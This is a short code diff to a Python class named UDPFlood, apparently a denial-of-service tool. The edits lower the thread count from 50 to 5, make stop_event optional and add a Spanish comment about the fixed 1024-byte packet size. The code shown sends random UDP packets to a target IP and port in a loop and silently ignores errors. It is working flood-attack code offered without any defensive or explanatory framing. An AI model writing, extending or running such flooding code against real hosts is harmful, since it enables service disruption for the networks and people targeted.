@@ -4,7 +4,7 @@ import os
 import time
 
 class UDPFlood:
-    def __init__(self, ip, port, threads, stop_event=None):
+    def __init__(self, ip, port, threads=5, stop_event=None):
         self.ip = ip
         self.port = port
         self.threads = threads
@@ -37,12 +37,12 @@ class UDPFlood:
                 break
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                data = os.urandom(1024)
+                data = os.urandom(1024)  # packet size fijo en 1024
                 s.sendto(data, (self.ip, self.port))
                 s.close()
             except Exception:
                 pass
 
-def run(ip, port, duration, stop_event):
-    attacker = UDPFlood(ip, port, threads=50, stop_event=stop_event)
+def run(ip, port, duration, stop_event=None):
+    attacker = UDPFlood(ip, port, threads=5, stop_event=stop_event)
     attacker.flood(duration)
